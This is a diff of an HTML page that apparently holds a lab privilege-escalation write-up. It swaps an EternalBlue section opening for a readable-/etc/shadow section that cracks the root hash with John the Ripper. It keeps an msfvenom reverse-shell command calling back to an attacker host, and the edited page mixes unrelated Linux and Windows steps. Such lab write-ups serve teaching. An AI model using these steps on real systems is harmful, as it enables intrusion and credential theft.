@@ -48,7 +48,7 @@
             </section>
             
             <section id="One">
-                <h2>Technique One - Service Exploits</h2>
+                <h2>Service Exploits - MySQL</h2>
                 <p>The first challenge informs us that there is an incorrectly configured MySQL service running as root. It also tells us there is no password! Let us start a command-line client session and connect to the MySQL server as the user root.</p>
                 <pre><code>user@debian:~$ mysql -u root</code></pre>
                 <p>Sure enough the connection was successful. No password required!</p>
@@ -104,17 +104,24 @@ Query OK, 0 rows affected (0.00 sec)</code></pre>
 rootbash-4.1# whoami
 root</code></pre>
                 <p><strong>Congratulations, you own the system!</strong></p>
-                
             </section>
-
-
-            
             <section id="Two">
-                <h2>Technique Two - </h2>
-                <p>I now know the machine is vulnerable to CVE-2017-0143. I have also found an interesting GitHub repo that includes some relevant, EternalBlue, exploit code. The repo actually contains the following file "eternalblue_kshellcode_x64.asm". This is an x64 assembly file, containing 64-bit kernel shellcode (kernel shellcode is a type of shellcode that runs with kernel-level (ring 0) privileges, i.e. full access to system hardware, memory etc). The repo even comes with shell scripts for assembling the entire payload, reverse shell included. However, this is a learning process, so let us do some of this manually.</p>
-                <p>A quick look at the script "shell_prep.sh" and we can quickly see how this is achieved. The shell runs the following command.</p>
-                <pre><code>nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin</code></pre>
-                <p>This command invokes Netwide Assembler (NASM) to assemble the shellcode to a raw binary (.bin) file, i.e. a direct translation into machine code, no headers or metadata. Run this command directly to create your payload file "sc_x64_kernel.bin".</p>
+                <h2>Readable /etc/shadow</h2>
+                <p>The "/etc/shadow" file that contains user password hashes should only be readable by root. Let us see if that is the case:</p>
+                <pre><code>user@debian:~$ ls -l /etc/shadow
+-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow</code></pre>
+                <p>Nope! It is readable by absolutely everyone! Let us have a look inside:</p>
+                <pre><code>user@debian:~$ nano /etc/shadow
+root:$6$Tb/euwmL$*********************************************</code></pre>
+                <p>We have the password hash for root (I have masked it here, so you can go and look for yourself). This is likely a <strong>SHA512crypt</strong> hash, as this is the hashing algorithm commonly used in Unix-like operating systems to store password hashes in the system's "/etc/shadow" file. Let's use John the Ripper (JTR) to see if we can crack it.</p>
+                <pre><code>user@local:~/path/to/john$ ./john -format=sha512crypt -wordlist=/I/am/using/rockyou.txt /path/to/saved/hash</code></pre>
+                <p>Sure enough this gives us the root password. Switch back to the target machine and switch to root, using the password.</p>
+                <pre><code>user@debian:~$ su root
+Password:
+root@debian/home/user# whoami
+root</code></pre>
+                
+                
                 <p>I can also see that the "shell_prep.sh" script would have given us options to generate a reverse shell, either a Meterpreter shell or a regular cmd shell, for which it would also generate a raw binary file. Finally, it would have combined this reverse shell binary with the kernel shell code binary. So far, as we are doing this manually, we have only created the shellcode binary, "sc_x64_kernel.bin". We need to create a raw binary of a reverse shell for this exploit to work. Of course I cannot read the binary and I have not read the assembly, but I imagine the kernel shell code takes control of the target system's kernel, perhaps to gain elevated privileges and preparing the system for executing further commands, and will then execute the reverse shell, which we can catch on our local machine. </p>
                 <p>Let us create our reverse shell code binary using <i>msfvenom</i>. Here we create a stageless Windows, 64-bit, reverse-tcp shell, in raw binary format.</p>
                 <pre><code>case@local:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={LOCAL_IP} LPORT=444 -a x64 -f raw -o sc_x64_msf.bin</code></pre>
@@ -133,6 +140,11 @@ Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32></code></pre>
+
+
+
+
+
                 
             <section id="Three">
                 <h2>Step Three - Escalation and Password Dumping</h2>
